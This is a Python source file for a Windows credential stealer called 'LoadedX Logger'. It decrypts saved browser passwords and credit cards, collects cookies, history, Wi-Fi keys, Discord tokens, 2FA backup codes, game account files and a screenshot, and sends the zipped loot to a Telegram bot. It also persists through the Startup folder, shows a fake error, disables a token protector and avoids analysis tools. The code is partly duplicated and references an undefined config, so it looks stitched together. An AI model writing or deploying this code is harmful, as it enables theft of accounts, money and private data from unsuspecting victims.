import base64
import concurrent.futures
import csv
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile
import shutil
import binascii
import psutil
import requests
from Cryptodome.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

# Global Telegram Settings
BOT_TOKEN = ":"
CHAT_ID = ""

# Global Variables
temp = os.getenv("TEMP") or os.getcwd()
appdata = os.getenv("APPDATA")
localappdata = os.getenv("LOCALAPPDATA")
roaming = appdata
temp_path = os.path.join(
    temp,
    ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
)
os.makedirs(temp_path, exist_ok=True)

def send_tg_msg(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_tg_file(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
    except: pass

def fakeerror():
    try:
        ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
    except: pass

def startup():
    try:        
        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        source_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
        target_path = os.path.join(startup_path, os.path.basename(source_path))
        if os.path.exists(target_path):
            os.remove(target_path)
        copy2(source_path, startup_path)
    except: pass

def killprotector():
    try:
        path = f"{roaming}\\DiscordTokenProtector"
        config = path + "\\config.json"
        if os.path.exists(path):
            for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
                try: os.remove(path + process)
                except: pass
            if os.path.exists(config):
                with open(config, errors="ignore") as f:                    item = json.load(f)
                item['auto_start'] = item['auto_start_discord'] = item['integrity'] = item['integrity_allowbetterdiscord'] = item['integrity_checkexecutable'] = item['integrity_checkhash'] = item['integrity_checkmodule'] = item['integrity_checkscripts'] = item['integrity_checkresource'] = item['integrity_redownloadhashes'] = False
                item['version'] = 69420
                with open(config, 'w') as f: json.dump(item, f, indent=2, sort_keys=True)
    except: pass

def get_system_info():
    try:
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2].strip()
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True).decode('utf-8').split('\n')[1].strip()
        ip = requests.get('https://api.ipify.org').text
        mac = next(iter(psutil.net_if_addrs().items()))[1][0].address
        msg = f"💻 **User:** `{os.getlogin()}`\n🏠 **PC Name:** `{os.getenv('COMPUTERNAME')}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n🧠 **CPU:** `{cpu}`\n🎮 **GPU:** `{gpu}`\n💾 **RAM:** `{ram}GB`"
        send_tg_msg(f"LoadedX Logger - System Info\n\n{msg}")
    except: pass

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        return None

def decrypt_password(buff, master_key):
    try:        
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return ""

def passwords(name, path, profile, master_key):    
    if name in ('opera', 'opera-gx'):
        db_path = os.path.join(path, 'Login Data')
    else:
        db_path = os.path.join(path, profile, 'Login Data')
    
    if not os.path.isfile(db_path):
        return
    
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
    for results in cursor.fetchall():
        if not results[0] or not results[1] or not results[2]:
            continue
        url = results[0]
        login = results[1]        
        password = decrypt_password(results[2], master_key)
        with open(password_file_path, "a", encoding="utf-8") as f:
            if os.path.getsize(password_file_path) == 0:
                f.write("Website  |  Username  |  Password\n\n")
            f.write(f"{url}  |  {login}  |  {password}\n")
    cursor.close()
    conn.close()

def cookies(name, path, profile):
    if name in ('opera', 'opera-gx'):
        db_path = os.path.join(path, 'Network', 'Cookies')
    else:
        db_path = os.path.join(path, profile, "Network", "Cookies")

    if not os.path.exists(db_path): return
    
    temp_db = os.path.join(temp, f"{name}_{profile}_cookies.db")
    shutil.copyfile(db_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    conn.text_factory = bytes 
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
        rows = cursor.fetchall()
        out_file = os.path.join(temp_path, "Browser", "cookies.txt")
        with open(out_file, 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     profile: {profile}\n\n")
            for host_key, cname, cpath, encrypted_value, expires_utc in rows:
                if isinstance(encrypted_value, (bytes, bytearray)):
                    encrypted_hex = binascii.hexlify(encrypted_value).decode("ascii")
                else:
                    encrypted_hex = str(encrypted_value)
                f.write(f"{host_key.decode()}\t{cname.decode()}={encrypted_hex}\tPath={cpath.decode()}\tExpires={expires_utc}\n")
    except: pass
    cursor.close()    
    conn.close()
    try: os.remove(temp_db)
    except: pass

def history(name, path, profile):
    if name in ('opera', 'opera-gx'):
        db_path = os.path.join(path, 'History')
    else:
        db_path = os.path.join(path, profile, 'History')
    
    if not os.path.isfile(db_path): return
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    history_file_path = os.path.join(temp_path, "Browser", "history.txt")
    with open(history_file_path, 'a', encoding="utf-8") as f:
        if os.path.getsize(history_file_path) == 0:
            f.write("Url  |  Visit Count\n\n")
        try:
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                f.write(f"{res[0]}  |  {res[1]}\n")
        except: pass
    cursor.close()
    conn.close()

def credit_cards(name, path, profile, master_key):
    if name in ('opera', 'opera-gx'):
        db_path = os.path.join(path, 'Web Data')
    else:
        db_path = os.path.join(path, profile, 'Web Data')
        
    if not os.path.isfile(db_path): return
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
    with open(cc_file_path, 'a', encoding="utf-8") as f:
        if os.path.getsize(cc_file_path) == 0:
            f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number\n\n")
        try:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                card_number = decrypt_password(res[3], master_key)
                f.write(f"{res[0]}  |  {res[1]}  |  {res[2]}  |  {card_number}\n")
        except: pass
    cursor.close()
    conn.close()

def process_browser(name, path, profile, func, master_key=None):
    try:
        if master_key:
            func(name, path, profile, master_key)
        else:
            func(name, path, profile)
    except: pass

def grab_browsers():
    try:
        browser_exe = ["chrome.exe", "chromium.exe", "firefox.exe", "brave.exe", "opera.exe", "msedge.exe"]
        browsers = {
            'google-chrome': os.path.join(appdata, 'Google', 'Chrome', 'User Data'),
            'microsoft-edge': os.path.join(appdata, 'Microsoft', 'Edge', 'User Data'),
            'opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
            'opera-gx': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
            'brave': os.path.join(appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        }
        
        profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in browser_exe:                
                try: proc.kill()
                except: pass

        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
        threads = []

        for name, path in browsers.items():
            if not os.path.exists(path): continue
            
            m_key = get_master_key(os.path.join(path, 'Local State'))
            if not m_key: continue

            for profile in profiles:
                t1 = threading.Thread(target=process_browser, args=(name, path, profile, passwords, m_key))
                t2 = threading.Thread(target=process_browser, args=(name, path, profile, cookies))
                t3 = threading.Thread(target=process_browser, args=(name, path, profile, history))
                t4 = threading.Thread(target=process_browser, args=(name, path, profile, credit_cards, m_key))
                for t in [t1, t2, t3, t4]:
                    t.start()
                    threads.append(t)

        for thread in threads: thread.join()
        roblox_cookies()
    except: pass

def grab_wifi():
    try:
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        profiles = [i.split(":")[1][1:-1] for i in subprocess.getoutput('netsh wlan show profiles').split('\n') if "All User profiles" in i]
        with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w') as f:
            for p in profiles:
                res = subprocess.getoutput(f'netsh wlan show profiles "{p}" key=clear')
                key = [b.split(":")[1][1:-1] for b in res.split('\n') if "Key Content" in b]
                f.write(f"SSID: {p} | Password: {key[0] if key else ''}\n")
    except: pass

def grab_minecraft():
    try:
        mc = os.path.join(roaming, ".minecraft")
        if os.path.exists(mc):
            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
            for f in ["launcher_accounts.json", "usercache.json"]:                
                if os.path.exists(os.path.join(mc, f)): copy2(os.path.join(mc, f), os.path.join(temp_path, "Minecraft", f))
    except: pass

def grab_backup_codes():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "Downloads", "discord_backup_codes.txt")
        if os.path.exists(path):
            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w") as f:
                for line in open(path, "r"):
                    if line.startswith("*"): f.write(line)
    except: pass
    
def discord_decrypt(buff, master_key):
    try:
        iv, payload = buff[3:15], buff[15:]
        return AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
    except: pass

def discord_get_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    except: pass

def debug_check():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        black_hwids = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009']
        if hwid in black_hwids: sys.exit(0)
        for proc in psutil.process_iter(['name']):
            if any(x in proc.info['name'].lower() for x in ["wireshark", "fiddler", "httpdebuggerui"]): sys.exit(0)
    except: pass

def self_destruct():
    try:
        path = sys.executable if hasattr(sys, 'frozen') else __file__
        subprocess.Popen(f'timeout 3 & del /F "{path}"', shell=True)
        os._exit(0)
    except: pass

def run_extraction():
    try:
        tasks = [grab_browsers, grab_wifi, grab_minecraft, grab_backup_codes, grab_discord, killprotector, fakeerror, startup]
        with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as ex:
            ex.map(lambda f: f(), tasks)
        
        zip_path = os.path.join(temp_path, f'Logged-{os.getlogin()}.zip')
        with ZipFile(zip_path, "w", ZIP_DEFLATED) as cz:
            for root, _, files in os.walk(temp_path):
                for f in files: cz.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), temp_path))
        
        send_tg_file(zip_path, caption=f"LoadedX Log - {os.getlogin()}")
        get_system_info()
        os.remove(zip_path)
        shutil.rmtree(temp_path)
    except: pass

def cookies(name, path, profile):
            db_path = os.path.join(path, profile, 'Network', 'Cookies') if 'opera' not in name else os.path.join(path, 'Network', 'Cookies')
            if not os.path.exists(db_path): return
            tmp_db = os.path.join(temp, f"c{random.randint(1,999)}")
            copy2(db_path, tmp_db)            
            conn = sqlite3.connect(tmp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
                out = os.path.join(temp_path, "Browser", "cookies.txt")
                with open(out, 'a', encoding="utf-8") as f:
                    for r in cursor.fetchall():
                        f.write(f"{r[0].decode()}\t{r[1].decode()}={binascii.hexlify(r[3]).decode()}\t{r[2].decode()}\t{r[4]}\n")
            except: pass
            conn.close()
            os.remove(tmp_db)


def roblox_cookies():
    try:
        robo_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
        if not __CONFIG__.get("roblox"): return
        src = os.path.join(temp_path, "Browser", "cookies.txt")
        if not os.path.exists(src): return
        with open(src, 'r', encoding="utf-8") as g, open(robo_file, 'w', encoding="utf-8") as f:
            for line in g:
                if ".ROBLOSECURITY" in line:
                    f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n\n")
            if os.path.getsize(robo_file) == 0: f.write("No Roblox Cookies Found")
    except: pass

def grab_wifi():
    try:
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        profiles = [i.split(":")[1][1:-1] for i in subprocess.getoutput('netsh wlan show profiles').split('\n') if "All User profiles" in i]
        with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w') as f:
            for p in profiles:
                res = subprocess.getoutput(f'netsh wlan show profiles "{p}" key=clear')
                key = [b.split(":")[1][1:-1] for b in res.split('\n') if "Key Content" in b]
                f.write(f"SSID: {p} | Password: {key[0] if key else ''}\n")
    except: pass

def grab_minecraft():
    try:
        mc = os.path.join(roaming, ".minecraft")
        if os.path.exists(mc):
            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
            for f in ["launcher_accounts.json", "usercache.json"]:
                if os.path.exists(os.path.join(mc, f)): copy2(os.path.join(mc, f), os.path.join(temp_path, "Minecraft", f))
    except: pass

def grab_backup_codes():
    try:
        path = os.path.join(os.environ["USERPROFILE"], "Downloads", "discord_backup_codes.txt")
        if os.path.exists(path):
            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)            
            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w") as f:
                for line in open(path, "r"):
                    if line.startswith("*"): f.write(line)
    except: pass

def discord_decrypt(buff, master_key):
    try:
        iv, payload = buff[3:15], buff[15:]
        return AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
    except: pass

def discord_get_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    except: pass

def grab_discord():
    try:
        baseurl = "https://discord.com/api/v9/users/@me"
        regex, enc_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r'dQw4w9WgXcQ:[^\"]*'
        tokens, ids = [], []
        paths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\'}
        for name, path in paths.items():
            if not os.path.exists(path): continue
            m_key_path = roaming + f'\\{name.replace(" ", "").lower()}\\Local State'
            m_key = discord_get_key(m_key_path) if os.path.exists(m_key_path) else None
            for f_name in os.listdir(path):
                if not f_name.endswith((".log", ".ldb")): continue
                for line in [x.strip() for x in open(f'{path}\\{f_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(enc_regex, line):
                        token = discord_decrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), m_key)
                        if token: tokens.append(token)
                    for token in re.findall(regex, line): tokens.append(token)
        for token in set(tokens):
            r = requests.get(baseurl, headers={'Authorization': token})
            if r.status_code == 200:
                user = r.json()
                if user['id'] not in ids:
                    ids.append(user['id'])
                    send_tg_msg(f"Discord Token Found\n👤 User: {user['username']}\n🔑 Token: {token}")
        ImageGrab.grab(all_screens=True).save(os.path.join(temp_path, "desktopshot.png"))
    except: pass

def debug_check():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        black_hwids = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009']
        if hwid in black_hwids: sys.exit(0)
        for proc in psutil.process_iter(['name']):
            if any(x in proc.info['name'].lower() for x in ["wireshark", "fiddler", "httpdebuggerui"]): sys.exit(0)
    except: pass

def self_destruct():
    try:
        path = sys.executable if hasattr(sys, 'frozen') else __file__
        subprocess.Popen(f'timeout 3 & del /F "{path}"', shell=True)
        os._exit(0)
    except: pass

def run_extraction():
    try:
        tasks = [grab_browsers, grab_wifi, grab_minecraft, grab_backup_codes, grab_discord, killprotector, fakeerror, startup]
        with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as ex:
            ex.map(lambda f: f(), tasks)
        zip_path = os.path.join(temp, f'Logged-{os.getlogin()}.zip')
        with ZipFile(zip_path, "w", ZIP_DEFLATED) as cz:
            for root, _, files in os.walk(temp_path):
                for f in files: cz.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), temp_path))
        send_tg_file(zip_path, caption=f"LoadedX Log - {os.getlogin()}")
        get_system_info()
        
    except: pass

if __name__ == '__main__':
    if os.name == "nt":
        debug_check()
        run_extraction()
